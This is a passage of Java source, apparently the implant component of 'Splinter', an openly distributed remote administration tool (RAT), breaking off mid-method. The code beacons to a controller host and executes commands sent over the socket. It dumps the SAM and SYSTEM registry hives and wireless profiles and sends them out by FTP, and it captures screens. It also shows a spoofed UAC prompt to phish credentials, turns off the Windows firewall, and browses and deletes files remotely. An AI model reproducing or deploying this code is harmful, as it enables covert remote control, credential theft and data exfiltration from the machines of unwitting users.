/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/


package Implant;

import Controller.Drivers.Drivers;
import Controller.GUI.Object_FileBrowser;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import Implant.FTP.IncrementObject;
import Implant.Payloads.CaptureScreen;
import Implant.Payloads.ClipboardPayload;
import Implant.Payloads.Directory_Orbiter;
import Implant.Payloads.EnumerateSystem;
import Implant.Payloads.Frame_SpoofUAC;
import Implant.Payloads.MapSystemProperties;
import Implant.Payloads.Worker_Thread_Payloads;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import javax.swing.JTextField;
import javax.swing.Timer;
import javax.swing.filechooser.FileSystemView;

public class Splinter_IMPLANT extends Thread
  implements Runnable, ActionListener
{
  Worker_Thread_Payloads beaconWorkerThread = null;

  static String strMyClassName = "Splinter_IMPLANT";

  EnumerateSystem enumeration = null;
  public static final String OMIT_READING_OUTPUT_STREAMS_UPON_COMMAND_EXECUTION = "&";
  String strAddrToController = "";
  int portToController = 0;
  boolean beaconUponDisconnection = false;
  boolean beaconToControllerImmediatelyUponDisconnection = false;
  int beaconInterval_millis = 0;

  boolean respondToTimerInterrupt = false;

  Timer tmrBeacon = null;

  public volatile boolean continueRun = true;

  public String myUniqueDelimiter = "";
  public String randomNumberReceived = "";
  public String confirmation_agent_ID_from_CONTROLLER = "";

  public BufferedReader brIn = null;
  public PrintWriter pwOut = null;

  public volatile boolean initialConnectionEstablished = false;

  public Socket sktMyConnection = null;

  String myHandShake = null;

  MapSystemProperties systemMap = null;

  boolean listeningMode = false;

  Process process = null;
  BufferedReader process_IN = null;
  BufferedReader process_IN_ERROR = null;
  PrintWriter process_OUT = null;

  volatile Timer tmrRunningProcessList = null;
  volatile boolean processInterrupt_RunningProcessList = false;
  volatile ArrayList<String> alRunningProcessList = null;
  volatile Process proc = null;

  volatile long disconnectionCount = 0L;

  public BufferedReader brIn_WorkerThread = null;

  FileSystemView fsv = null;
  File myFileBrowserCurrentFile = null;
  File myFileBrowserNewFile = null;
  File[] arrFileRoot = null;
  File[] arrFileList = null;

  public volatile boolean i_am_connected_to_relay = false;
  public volatile boolean i_am_beacon_implant = false;
  public volatile boolean beacon_provide_response = false;
  public volatile boolean beacon_has_sent_handshake = false;
  public volatile boolean i_am_called_from_beacon_agent = false;

  Frame_SpoofUAC spoof = null;

  public Splinter_IMPLANT(String strControllerAddie, int controllerPort, boolean enableBeaconingUponDisconnection, boolean reconnectImmediatelyUponDisconnection, int beaconIntvl_millis)
  {
    try
    {
      this.strAddrToController = strControllerAddie;
      this.portToController = controllerPort;
      this.beaconUponDisconnection = enableBeaconingUponDisconnection;
      this.beaconToControllerImmediatelyUponDisconnection = reconnectImmediatelyUponDisconnection;
      this.beaconInterval_millis = beaconIntvl_millis;
      Driver.alConnectedFTPClients = new ArrayList();
    }
    catch (Exception e)
    {
      Driver.eop("Constructor - Implant", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
    }
  }

  public Splinter_IMPLANT(String strControllerAddie, int controllerPort, int beaconIntvl_millis)
  {
    try
    {
      this.strAddrToController = strControllerAddie;
      this.portToController = controllerPort;
      this.beaconUponDisconnection = true;
      this.beaconToControllerImmediatelyUponDisconnection = false;
      this.beaconInterval_millis = beaconIntvl_millis;
      Driver.alConnectedFTPClients = new ArrayList();
    }
    catch (Exception e)
    {
      Driver.eop("Constructor - True Beacon", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
    }
  }

  public Splinter_IMPLANT(int listen_port, Socket sktConnection)
  {
    try
    {
      this.sktMyConnection = sktConnection;

      this.listeningMode = true;
    }
    catch (Exception e)
    {
      Driver.eop("Constructor - Listener", "Splinter_IMPLANT", e, e.getLocalizedMessage(), false);
    }
  }

  public void run()
  {
    try
    {
      if (this.i_am_beacon_implant)
      {
        if (this.beaconWorkerThread != null)
        {
          this.beaconWorkerThread.killThisThread = true;
        }

        this.beaconWorkerThread = new Worker_Thread_Payloads(this.beaconInterval_millis, this, 3, null, this.strAddrToController, this.portToController, null);
      }
      else if (this.sktMyConnection == null)
      {
        startImplant();
      }
      else
      {
        listenToSocket(this.sktMyConnection);

        Driver.removeThread(this, getId());

        Driver.sop("Connection has been closed. Terminating this thread...");
        this.continueRun = false;
      }

      do
      {
        if (System.in.read() <= 0) break;  } while (this.continueRun);
    }
    catch (Exception e)
    {
      Driver.eop("run", strMyClassName, e, "", false);
    }
  }

  public boolean listenToSocket(Socket sktConnection)
  {
    try
    {
      String inputLine = "";
      this.brIn = null;
      this.pwOut = null;
      this.initialConnectionEstablished = true;

      if (sktConnection != null)
      {
        Driver.sp("Connection established!  Attempting to open streams on socket...");

        this.brIn = new BufferedReader(new InputStreamReader(sktConnection.getInputStream()));

        this.pwOut = new PrintWriter(new BufferedOutputStream(sktConnection.getOutputStream()));

        Driver.sop("Streams opened");

        String handShakeData = Driver.getHandshakeData("%%%%%");

        if ((this.i_am_beacon_implant) && (!this.beacon_provide_response) && (!this.beacon_has_sent_handshake))
        {
          sendToController("[SPLINTER_BEACON]" + handShakeData, false, false);
          this.beacon_has_sent_handshake = true;
        } else {
          if (this.i_am_beacon_implant)
          {
            sendToController("[SPLINTER_BEACON_RESPONSE_HEADER]" + this.confirmation_agent_ID_from_CONTROLLER, false, false);

            return true;
          }

          sendToController("[SPLINTER_IMPLANT]" + handShakeData, false, false);
        }

        this.randomNumberReceived = this.brIn.readLine();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.randomNumberReceived + "]");

        Driver.sop("HandShake complete. " + this.myUniqueDelimiter);

        if (this.i_am_beacon_implant)
        {
          return true;
        }

        executeCommand(" ");

        while ((this.continueRun) && (!sktConnection.isClosed()) && ((inputLine = this.brIn.readLine()) != null) && (!inputLine.equals("disconnectImplant")))
        {
          if ((inputLine.trim().startsWith(this.myUniqueDelimiter)) || (inputLine.trim().startsWith("[SPLINTER_IMPLANT]")))
          {
            if (!determineCommand(inputLine))
            {
              executeCommand(inputLine);
            }

          }
          else if (inputLine != null)
          {
            executeCommand(inputLine);
          }

        }

        if (inputLine.equals("disconnectImplant"))
        {
          Driver.sop("Disconnection notice received. Terminating program...");

          if (this.i_am_called_from_beacon_agent)
          {
            try
            {
              this.sktMyConnection.close();
            }
            catch (Exception localException1) {
            }
          }
          else System.exit(0);

        }

      }

      return true;
    }
    catch (NullPointerException npe)
    {
      Driver.sop("* Streams closed!");
    }
    catch (SocketException se)
    {
      Driver.sop("Streams closed!!!");
    }
    catch (Exception e)
    {
      Driver.eop("listenToSocket", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean startImplant()
  {
    try
    {
      do
      {
        try
        {
          Driver.sp("\n" + Driver.getTimeStamp_Without_Date() + " - Attempting to connect to \"" + this.strAddrToController + ":" + this.portToController + "\"...");

          if ((this.strAddrToController != null) && (this.strAddrToController.trim().equalsIgnoreCase("localhost")))
          {
            this.strAddrToController = "127.0.0.1";
          }

          this.sktMyConnection = new Socket(this.strAddrToController, this.portToController);

          if (this.sktMyConnection == null)
          {
            throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");
          }

        }
        catch (Exception e)
        {
          if (this.beaconToControllerImmediatelyUponDisconnection)
          {
            if (!this.initialConnectionEstablished)
            {
              this.beaconInterval_millis = 4000;

              Driver.sop("Initial connection unsuccessful.  Delaying " + this.beaconInterval_millis / 1000 + " secs and attempting to connect one more time to connect");
              this.beaconToControllerImmediatelyUponDisconnection = false;

              if ((this.tmrBeacon != null) && (this.tmrBeacon.isRunning()))
              {
                try
                {
                  this.tmrBeacon.stop();
                } catch (Exception localException1) {
                }
              }
              this.respondToTimerInterrupt = true;
              this.tmrBeacon = new Timer(4000, this);
              this.tmrBeacon.start();
            }

          }
          else
          {
            if (this.beaconUponDisconnection)
            {
              Driver.sop("Unable to connect to \"" + this.strAddrToController + ":" + this.portToController + "\"" + " Sleeping for " + this.beaconInterval_millis / 1000 + " secs before attempting to re-establish connection to controller");
              this.respondToTimerInterrupt = true;
              this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
              this.tmrBeacon.start();
              return true;
            }

            throw new IOException("Unable to connect to \"" + this.strAddrToController + " : " + this.portToController + "\"" + " beaconing is not set. Terminating program...");
          }

        }

        listenToSocket(this.sktMyConnection);

        if (this.beaconToControllerImmediatelyUponDisconnection)
        {
          if (++this.disconnectionCount % 100L == 0L)
          {
            this.beaconToControllerImmediatelyUponDisconnection = false;
            this.beaconInterval_millis = 60000;
            Driver.sop("\n***\n*\n*Threshold reached. Controller not responding. Waiting: " + this.beaconInterval_millis / 1000 + " sec before reconnect\n*\n*\n***\n");
          }

          return startImplant();
        }

        if ((this.beaconUponDisconnection) && (!this.beaconToControllerImmediatelyUponDisconnection) && (this.beaconInterval_millis > 1000))
        {
          if (++this.disconnectionCount % 100L == 0L)
          {
            this.beaconInterval_millis *= 2;
            if (this.beaconInterval_millis > 3000000.0D)
            {
              this.beaconInterval_millis = 3000000;
            }
            Driver.sop("Threshold reached. Controller not responding, waiting: " + this.beaconInterval_millis / 1000 + " seconds before reconnect");
          }

          this.respondToTimerInterrupt = true;

          Driver.sop("Disconnected. Sleeping for " + this.beaconInterval_millis / 1000 + " secs before re-establishing connection to controller");
          this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
          this.tmrBeacon.start();
          return true;
        }

        Driver.sop("Connection lost!  ");
      }
      while (
        this.beaconUponDisconnection);

      throw new IOException("Disconnected from controller.  Beacon is not set.  Terminating program...");
    }
    catch (IOException ioe)
    {
      Driver.sop("Disconnected from controller.  * Beacon is not set...  Terminating program...");
      this.continueRun = false;

      if (this.i_am_called_from_beacon_agent)
      {
        try
        {
          this.sktMyConnection.close();
        }
        catch (Exception localException2) {
        }
      }
      else System.exit(0);

    }
    catch (Exception e)
    {
      if ((this.sktMyConnection != null) && ((this.sktMyConnection.isClosed()) || (!this.sktMyConnection.isConnected())))
      {
        Driver.sop("Socket is closed.");

        this.initialConnectionEstablished = false;

        if (this.beaconToControllerImmediatelyUponDisconnection)
        {
          return startImplant();
        }

        if ((this.beaconUponDisconnection) && (!this.beaconToControllerImmediatelyUponDisconnection) && (this.beaconInterval_millis > 1000))
        {
          this.respondToTimerInterrupt = true;

          Driver.sop("Disconnected. Sleeping for " + this.beaconInterval_millis / 1000 + " secs before connecting to controller");
          this.tmrBeacon = new Timer(this.beaconInterval_millis, this);
          this.tmrBeacon.start();
          return true;
        }

        Driver.sop("Terminating program...");
      }

      Driver.sop("Exception caught in startImplant mtd in " + strMyClassName + " Error msg: " + e.getLocalizedMessage());
    }

    return false;
  }

  public boolean sendToController(String lineToSend, boolean appendHeader, boolean printStatusToConsoleOut)
  {
    try
    {
      if ((this.pwOut == null) || (this.sktMyConnection == null) || (!this.sktMyConnection.isConnected()))
      {
        Driver.sop("socket not yet connected");
        return false;
      }

      if (appendHeader)
      {
        lineToSend = this.myUniqueDelimiter + lineToSend;
      }

      this.pwOut.println(lineToSend);
      this.pwOut.flush();

      if (printStatusToConsoleOut) {
        Driver.sop(lineToSend);
      }
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean determineCommand(String cmdLine)
  {
    try
    {
      String[] cmd = cmdLine.split("%%%%%");

      if ((cmd[1] == null) || (cmd[1].trim().equals("")))
      {
        Driver.sop("Unknown Command received: " + cmdLine);
        return false;
      }

      if ((cmd[0] != null) && (!cmd[0].trim().equals("")) && (cmd[0].equalsIgnoreCase("SET IMPLANT REGISTRATION")))
      {
        this.confirmation_agent_ID_from_CONTROLLER = cmd[1];
        return true;
      }

      if ((cmd[1] != null) && (!cmd[1].trim().equals("")) && (cmd[1].equalsIgnoreCase("SEND_FILE")))
      {
        sendFile(cmd);
        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("STOP_PROCESS"))
      {
        ProcessHandlerThread.stopProcess = true;
        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("CAPTURE_SCREEN"))
      {
        String screenCaptureHeader = System.currentTimeMillis() + "_screenCapture";

        if (sendScreenCaptures(cmd, cmd[2], screenCaptureHeader))
        {
          return true;
        }

        File fleScreenCaptureImage = Drivers.captureScreen(cmd[2], screenCaptureHeader);

        FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, cmd[3], Integer.parseInt(cmd[4]), 4096, fleScreenCaptureImage, this.pwOut, true, FTP_ServerSocket.FILE_TYPE_SCREEN_CAPTURES, null);
        FTP_Sender.start();

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("RUNNING_PS"))
      {
        if ((this.tmrRunningProcessList != null) && (this.tmrRunningProcessList.isRunning()))
        {
          try
          {
            this.tmrRunningProcessList.stop();
          } catch (Exception localException1) {
          }
        }
        sendToController("Initiating Running Process List. Please stand by...", false, false);

        this.processInterrupt_RunningProcessList = true;
        this.tmrRunningProcessList = new Timer(2000, this);
        this.tmrRunningProcessList.start();

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("STOP_RUNNING_PS"))
      {
        if (this.tmrRunningProcessList != null)
        {
          try
          {
            this.tmrRunningProcessList.stop();
          } catch (Exception localException2) {
          }
        }
        sendToController("Running Process Halted.", false, false);

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("ENUMERATE"))
      {
        this.enumeration = new EnumerateSystem(cmd[2], cmd[3], Integer.parseInt(cmd[4]), this.pwOut);
        this.enumeration.start();
      }

      if (cmd[1].trim().equalsIgnoreCase("HARVEST_WIRELESS_PROFILE"))
      {
        PrintWriter pwFileOut = null;
        try
        {
          String outDirectory = cmd[2];
          String FTP_Addr = cmd[3];
          int FTP_Port = Integer.parseInt(cmd[4]);
          File fleProfile = null;

          if ((outDirectory == null) || (outDirectory.trim().equals("")))
          {
            fleProfile = new File("." + Driver.fileSeperator, "_wireless_profile.txt");
          }
          else
          {
            fleProfile = new File(outDirectory, "_wireless_profile.txt");
          }

          pwFileOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleProfile.toString())));

          sendToController("Commencing Harvest of Wireless Profiles (if applicable) started @ " + Driver.getTimeStamp_Updated(), false, true);

          Process process = Runtime.getRuntime().exec(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE);

          BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
          BufferedReader process_IN_ERROR = new BufferedReader(new InputStreamReader(process.getErrorStream()));

          ProcessHandlerThread process_INPUT = new ProcessHandlerThread(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE, process, process_IN, pwFileOut);
          ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(EnumerateSystem.ENUMERATE_WIRELESS_PROFILE, process, process_IN_ERROR, pwFileOut);

          process_INPUT.start();
          process_INPUT_ERROR.start();

          System.gc();

          pwFileOut.flush();
          pwFileOut.close();

          sendToController("WIRELESS PROFILE HARVEST COMPLETE. Searching for Controller to FTP results...", false, true);

          FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, FTP_Addr, FTP_Port, 4096, fleProfile, this.pwOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
          FTP_Sender.start();
        }
        catch (Exception e)
        {
          sendToController("Unable to Harvest Wireless Profile!", false, false);
          try { pwFileOut.close(); }
          catch (Exception localException3)
          {
          }
        }
      }

      if (cmd[1].trim().equalsIgnoreCase("HARVEST_REGISTRY_HASHES"))
      {
        try
        {
          String outDirectory = cmd[2];
          String FTP_Addr = cmd[3];
          int FTP_Port = Integer.parseInt(cmd[4]);
          File fleSAM = null;
          File fleSYSTEM = null;

          if ((outDirectory == null) || (outDirectory.trim().equals("")))
          {
            fleSAM = new File("." + Driver.fileSeperator, "SAM_" + this.randomNumberReceived + ".hive");
            fleSYSTEM = new File("." + Driver.fileSeperator, "SYSTEM_" + this.randomNumberReceived + ".hive");
          }
          else
          {
            fleSAM = new File(outDirectory, "SAM_" + this.randomNumberReceived + ".hive");
            fleSYSTEM = new File(outDirectory, "SYSTEM_" + this.randomNumberReceived + ".hive");
          }

          sendToController("Commencing Harvest of System PW Registry Hashes started @ " + Driver.getTimeStamp_Updated(), false, true);

          String fullCmd_SAM = "reg save HKLM\\SAM \"" + fleSAM.getCanonicalPath() + "\"" + " /y";
          String fullCmd_SYSTEM = "reg save HKLM\\SYSTEM \"" + fleSYSTEM.getCanonicalPath() + "\"" + " /y";

          saveHashes(fullCmd_SAM, fleSAM, "HARVEST REGISTRY SAM HASHES COMPLETE.", FTP_Addr, FTP_Port, this.pwOut);
          saveHashes(fullCmd_SYSTEM, fleSYSTEM, "HARVEST REGISTRY SYSTEM HASHES COMPLETE.", FTP_Addr, FTP_Port, this.pwOut);
        }
        catch (Exception e) {
          sendToController("Unable to Harvest Wireless Profile!", false, false);
        }

      }

      if (cmd[1].trim().equalsIgnoreCase("SPOOF_UAC"))
      {
        if ((this.spoof != null) && ((this.spoof.isShowing()) || (this.spoof.isActive()) || (this.spoof.isBackgroundSet())))
          try {
            this.spoof.dispose();
          } catch (Exception localException4) {
          }
        this.spoof = new Frame_SpoofUAC(cmd[2], cmd[3], this);
        try
        {
          this.spoof.jtfUserName.setText(MapSystemProperties.strUserName);
        }
        catch (Exception e)
        {
          this.spoof.jtfUserName.setText("User Name");
        }

        this.spoof.setVisible(true);
      }

      if (cmd[1].trim().equalsIgnoreCase("DISABLE_WINDOWS_FIREWALL"))
      {
        sendToController("\nAttempting to disable firewall...\n", false, false);

        executeCommand("netsh advfirewall set allprofiles state off", this.pwOut);
        sendToController("\nCommand executed, refreshing current firewall configuration...\n", false, false);
        executeCommand("netsh advfirewall show allprofiles", this.pwOut);
      }

      if (cmd[1].trim().equalsIgnoreCase("ENABLE_WINDOWS_FIREWALL"))
      {
        sendToController("\nAttempting to enable firewall...\n", false, false);
        executeCommand("netsh advfirewall set allprofiles state on", this.pwOut);
        sendToController("\nCommand executed, refreshing current firewall configuration...\n", false, false);
        executeCommand("netsh advfirewall show allprofiles", this.pwOut);
      }

      if (cmd[1].trim().equalsIgnoreCase("DISPLAY_WINDOWS_FIREWALL"))
      {
        executeCommand("netsh advfirewall show allprofiles", this.pwOut);
      }

      if (cmd[1].trim().equalsIgnoreCase("INITIATE_FILE_BROWSER"))
      {
        try
        {
          sendToController("Initiating File Browser. Please stand by...", false, false);
          this.fsv = FileSystemView.getFileSystemView();
          this.arrFileRoot = this.fsv.getRoots();
          try
          {
            this.myFileBrowserCurrentFile = this.fsv.getHomeDirectory();
            this.myFileBrowserNewFile = this.fsv.getHomeDirectory(); } catch (Exception e) {
            this.myFileBrowserCurrentFile = new File(".");
          }

          this.arrFileRoot = File.listRoots();
          File root = null;
          Object_FileBrowser objFile = null;

          sendToController(this.myUniqueDelimiter + "%%%%%" + "BEGIN_FILE_ROOTS", false, false);
          for (int i = 0; i < this.arrFileRoot.length; i++)
          {
            root = this.arrFileRoot[i];

            objFile = new Object_FileBrowser(this.fsv.isDrive(root), root, this.fsv.getSystemDisplayName(root), this.fsv.isFileSystem(root), this.fsv.isFloppyDrive(root), root.isDirectory(), root.isFile(), root.isHidden(), this.fsv.isTraversable(root), root.canRead(), root.canWrite(), root.canExecute(), root.getCanonicalPath(), this.fsv.getParentDirectory(root), root.lastModified(), root.getTotalSpace(), root.getUsableSpace(), root.length());

            sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_ROOTS" + "%%%%%" + objFile.getFileObjectData_Socket("#####"), false, false);
          }

          sendToController(this.myUniqueDelimiter + "%%%%%" + "END_FILE_ROOTS", false, false);
        }
        catch (Exception e)
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "*\n*\n*ERROR: UNABLE TO LOAD FILE ROOTS TO BROWSER SYSTEM \n*\n*\n*\n", false, false);
        }

      }

      if (cmd[1].trim().equalsIgnoreCase("FILE_BROWSER_DELETE_DIRECTORY"))
      {
        File fleToDelete = new File(cmd[2].trim());

        if (!fleToDelete.exists())
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Deletion for file \"" + cmd[2] + "\" received. File no longer exist. Unable to continue...", false, false);
          return true;
        }

        File parentDirectory = fleToDelete.getParentFile();
        boolean deletionSuccess = deleteFile(fleToDelete);

        if (deletionSuccess)
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Deletion for file \"" + fleToDelete.getCanonicalPath() + "\" received. File deletion successful!", false, false);

          mapFilesUnderDirectory(parentDirectory.getCanonicalPath());
        }
        else
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Deletion for file \"" + fleToDelete.getCanonicalPath() + "\" received. File deletion FAILED!!! Perhaps Access was Denied to file", false, false);
        }

        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("FILE_BROWSER_MAP_DIRECTORY"))
      {
        try
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Attempting to list files under Directory: " + cmd[2], false, false);

          this.fsv = FileSystemView.getFileSystemView();

          if ((cmd[2].trim().equalsIgnoreCase("c:")) || (cmd[2].trim().equalsIgnoreCase("c:" + Driver.fileSeperator)))
          {
            this.myFileBrowserNewFile = new File(Driver.fileSeperator);
          }
          else if (cmd[2].trim().endsWith(Driver.fileSeperator))
          {
            this.myFileBrowserNewFile = new File(cmd[2].trim());
          }
          else
          {
            this.myFileBrowserNewFile = new File(cmd[2].trim() + Driver.fileSeperator);
          }

          if ((this.myFileBrowserNewFile != null) && (this.myFileBrowserNewFile.exists()) && (!this.myFileBrowserNewFile.isFile()))
          {
            this.myFileBrowserCurrentFile = this.myFileBrowserNewFile;
          }
          else
          {
            if ((this.myFileBrowserCurrentFile == null) || (!this.myFileBrowserCurrentFile.exists()) || (this.myFileBrowserCurrentFile.isFile()))
            {
              this.myFileBrowserCurrentFile = new File(".");
            }

            sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "* * * * ERROR -->> Invalid directory specified. Returning to list: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);
          }

          this.arrFileList = this.myFileBrowserCurrentFile.listFiles();

          if (this.arrFileList == null)
          {
            this.myFileBrowserCurrentFile = new File(Driver.fileSeperator);

            sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "* * * ERROR -->>>> Invalid directory specified. Directory doesn't seem to exist or access was denied... Returning listing of: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);

            this.arrFileList = this.myFileBrowserCurrentFile.listFiles();
          }
          else if (this.arrFileList.length < 1)
          {
            sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "** NOTE -> No [Files] populated under specified directory: " + this.myFileBrowserCurrentFile.getCanonicalPath(), false, false);

            Object_FileBrowser objFile = new Object_FileBrowser(this.fsv.isDrive(this.myFileBrowserCurrentFile), this.myFileBrowserCurrentFile, this.fsv.getSystemDisplayName(this.myFileBrowserCurrentFile), this.fsv.isFileSystem(this.myFileBrowserCurrentFile), this.fsv.isFloppyDrive(this.myFileBrowserCurrentFile), this.myFileBrowserCurrentFile.isDirectory(), this.myFileBrowserCurrentFile.isFile(), this.myFileBrowserCurrentFile.isHidden(), this.fsv.isTraversable(this.myFileBrowserCurrentFile), this.myFileBrowserCurrentFile.canRead(), this.myFileBrowserCurrentFile.canWrite(), this.myFileBrowserCurrentFile.canExecute(), this.myFileBrowserCurrentFile.getCanonicalPath(), this.myFileBrowserCurrentFile.getParentFile(), this.myFileBrowserCurrentFile.lastModified(), this.myFileBrowserCurrentFile.getTotalSpace(), this.myFileBrowserCurrentFile.getUsableSpace(), this.myFileBrowserCurrentFile.length());

            sendToController(this.myUniqueDelimiter + "%%%%%" + "EMPTY_DIRECTORY" + "%%%%%" + this.myFileBrowserCurrentFile.getCanonicalPath() + "%%%%%" + objFile.getFileObjectData_Socket("#####"), false, false);

            return true;
          }

          File currFile = null;
          Object_FileBrowser objFile = null;

          sendToController(this.myUniqueDelimiter + "%%%%%" + "BEGIN_FILE_LIST", false, false);

          for (int i = 0; i < this.arrFileList.length; i++)
          {
            currFile = this.arrFileList[i];

            objFile = new Object_FileBrowser(this.fsv.isDrive(currFile), currFile, this.fsv.getSystemDisplayName(currFile), this.fsv.isFileSystem(currFile), this.fsv.isFloppyDrive(currFile), currFile.isDirectory(), currFile.isFile(), currFile.isHidden(), this.fsv.isTraversable(currFile), currFile.canRead(), currFile.canWrite(), currFile.canExecute(), currFile.getCanonicalPath(), currFile.getParentFile(), currFile.lastModified(), currFile.getTotalSpace(), currFile.getUsableSpace(), currFile.length());

            sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_LIST" + "%%%%%" + objFile.getFileObjectData_Socket("#####"), false, false);
          }

          sendToController(this.myUniqueDelimiter + "%%%%%" + "END_FILE_LIST", false, false);
        }
        catch (Exception e)
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR: UNABLE TO LOAD FILE ROOTS UNDER SPECIFIED DIRECTORY", false, false);
        }

      }

      if (cmd[1].trim().equalsIgnoreCase("FILE_BROWSER_CREATE_DIRECTORY"))
      {
        if ((cmd[3] == null) || (cmd[3].trim().equals("")))
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR: INVALID DIRECTORY SPECIFIED. UNABLE TO CREATE NEW DIRECTORY", false, false);
          return false;
        }

        File fleToCreate = null;

        if ((cmd[2] == null) || (cmd[2].trim().equals("")) || (cmd[2].trim().equals(".")) || (cmd[2].equals("." + Driver.fileSeperator)))
        {
          fleToCreate = Driver.fleCurrentWorkingDirectory;
        }

        fleToCreate = new File(cmd[2]);

        if ((!fleToCreate.exists()) || (!fleToCreate.isDirectory()))
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR: \"" + fleToCreate + "\" IS AN INVALID DIRECTORY SPECIFIED. UNABLE TO CREATE NEW DIRECTORY", false, false);
          return true;
        }

        File fleDirectoryToCreate = null;
        if (fleToCreate.getCanonicalPath().endsWith(Driver.fileSeperator))
        {
          fleDirectoryToCreate = new File(fleToCreate.getCanonicalPath() + cmd[3].trim());
        }
        else
        {
          fleDirectoryToCreate = new File(fleToCreate.getCanonicalPath() + Driver.fileSeperator + cmd[3].trim());
        }

        if ((fleDirectoryToCreate.exists()) || (fleDirectoryToCreate.isDirectory()))
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR: \"" + fleDirectoryToCreate.getCanonicalPath() + "\" ALREADY EXISTS!!!!", false, false);
          return true;
        }

        boolean success = fleDirectoryToCreate.mkdir();
        if (success)
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "SUCCESS!: \"" + fleDirectoryToCreate.getCanonicalPath() + "\" CREATED.", false, false);
          return mapFilesUnderDirectory(fleToCreate.getCanonicalPath());
        }

        sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "**** ERROR!  Unable to create directory: \"" + fleDirectoryToCreate + "\" Either invalid directory parameters specified or Access was Denied.", false, false);
        return true;
      }

      if (cmd[1].trim().equalsIgnoreCase("CAT_FILE"))
      {
        File fleToCat = null;
        try
        {
          fleToCat = new File(cmd[2].trim());

          if (fleToCat == null)
          {
            throw new Exception("Unknown file received!");
          }

        }
        catch (Exception e)
        {
          sendToController(this.myUniqueDelimiter + "%%%%%" + "FILE_BROWSER_MESSAGE" + "%%%%%" + "Invalid file received. Unable to cat file...", false, false);
          return true;
        }

        if (!fleToCat.exists())
        {
